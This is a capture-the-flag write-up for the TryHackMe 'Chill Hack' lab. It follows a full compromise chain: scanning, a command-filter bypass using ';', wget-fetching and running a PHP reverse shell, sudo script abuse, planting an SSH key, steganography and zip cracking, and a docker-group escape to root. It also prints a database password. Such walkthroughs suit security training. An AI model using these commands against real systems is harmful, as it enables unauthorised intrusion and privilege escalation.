```bash
# PLATFORM          . THM
# CTF NAME          . Chill Hack
# DESCRIPTION       . Chill the Hack out of the Machine.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/chillhack
```

```bash
sudo nmap -sSVC -T5 10.10.96.247 -p- -oN chill
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09f95db918d0b23a822d6e768cc20144 (RSA)
|   256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA)
|_  256 3005cc52c66f6504860f7241c8a439cf (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- FTP supports anonymous login, so let's grab the file from there.

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

- By fuzzing the webserver, we can find the `/secret` endpoint, which allows us to execute commands on the webserver. 

```bash
ffuf -u http://10.10.96.247/FUZZ -w /usr/share/wordlists/dirb/common.txt 
```

```
secret                  [Status: 301, Size: 313, Words: 20, Lines: 10]
```

- However, there are some commands that are being filtered. 

- The `whoami` command is not filtered, so at least we know we execute commands under `www-data`.

- The filter can be bypassed by using a permitted command, ; and the filtered command. 

eg: `whoami;ls`

- I tried using `wget` to get a reverse shell from my box and even if the command is technically running, the file couldn't be transferred because the current directory seems to be owned by root and we don't have write permissions.

```
total 16
drwxr-xr-x 3 root root 4096 Oct  4  2020 .
drwxr-xr-x 8 root root 4096 Oct  3  2020 ..
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1520 Oct  4  2020 index.php
```

- However, by using `whoami;/usr/bin` we can see a list of binaries available on the system. 

```
-rwxr-xr-x  1 root   root      4899864 May 26  2020 php7.2
```

- I was looking around the system to see if there's PHP installed and if I could leverage that to run my reverse shelll. 

- `php7.2` has execute permissions set for `others`, so we can use this to run our reverse shell once we find a writable path.

- I managed to find a writable folder by using

```bash
find / -type d -perm -o+w 2>/dev/null
```

```
/dev/mqueue
/dev/shm
/tmp
/run/screen
/run/lock
/var/lib/php/sessions
/var/tmp
/var/crash
```

- Then, I've moved over the reverse PHP shell from my box to the target using `whoami;cd /var/tmp;wget http://ip:port/shell.php`

```
whoami;ls /var/tmp

shell.php
```

- Now, we need to use the `php7.2` binary from `/usr/bin` to execute the shell: `whoami;/usr/bin/php7.2 /var/tmp/shell.php`

```
connect to [{REDACTED}] from (UNKNOWN) [10.10.96.247] 44904
Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:31:38 up  1:46,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

```


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
<CTRL + Z>
stty raw -echo; fg
```

```bash
sudo -l

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

```

```bash
# content of helpline.sh

#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

- the `$msg` variable is passed to `/dev/null` so we can technically write `bash -i` to spawn a shell as `apaar`.

- We can get the user flag from `/home/apaar/local.txt`

- By further inspecting the home directory of `apaar`, I noticed the `.ssh/authorized_keys` file pressent.

- I generated a new `ssh key pair` using `ssh-keygen -f apaar` on my box and echoed the content of `.pub` file in `.ssh/authorized_files`.

- After `chmod 600` on the private key, I was able to ssh to the box as `apaar` : `ssh -i apaar apaar@ip`

- After some time I spent enumerating the box, I noticed that `port 9001` is listening ; 

- Also, in the `/var/www/` directory we have the classic `html`, which is the website we've been using to gain the reverse shell, but there's also `files`.

```index.php
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
// {more content, irelevant for the writeup }
</html>
```

- We see that there's a mysql connection to the `webportal` db using the credentials `root:!@m+her00+@db`

- Also, if the login is successful, we're redirected to `hacker.php`.

```hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

```
Look in the dark! You will find your answer.
```

- So, considering port `9001` is also listening on the box, it might be that this local server is running on that port.

- I used `scp` to copy both `hacker-with-laptop_23-2147985341.jpg` and 
`002d7e638fb463fb7a266f5ffc7ac47d.gif` to my local box to see if there's anything hidden in them.

- I moved each file to `/home/apaar` and renamed it to `image` so I can have shorter scp syntax.

```bash
scp -i apaar apaar@10.10.96.247:/home/apaar/image.jpg image.jpg
```

- `steghide --extract -sf` on the `hacker-blabla` image did contain a `backup.zip` file which I cracked using `john`, since it asked for a passphase.

```
zip2john backup.zip > zipcrack
john zipcrack
```

- The zip contained a file called `source_code.php` which contained the following line

```
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
{
	// rest of the code
	{
		echo "Welcome Anurodh!";
	}
}
```

```
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d

!d0{redacted}rd
```

- Now, we can use `su anurodh` to switch to that user :) 

- However, besides the same `source_code.php` file, there's nothing interesting in the home directory.

- Going back to the previous idea, let's try creating a `ssh tunnel` to see what's running on port `9001`

```
ssh -i apaar -L 9001:127.0.0.1:9001 apaar@10.10.96.247
```

- Now, going to our browser of choice, we can navigate to `http://127.0.0.1:9001`

- There's one login form and the text seems to be identical with the one found in `/var/www/files/*.php` files we found earlier, so I assume there's no point in going this way.

- Back to our shell as `anurodh`, the `id` command reveals that we're in the `docker` group. Consulting this with [gtfobins](https://gtfobins.github.io/gtfobins/docker/) we see that we can abuse this to obtain a root shell.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
whoami
# root
```

- The last flag is in `/root/proof.txt`.
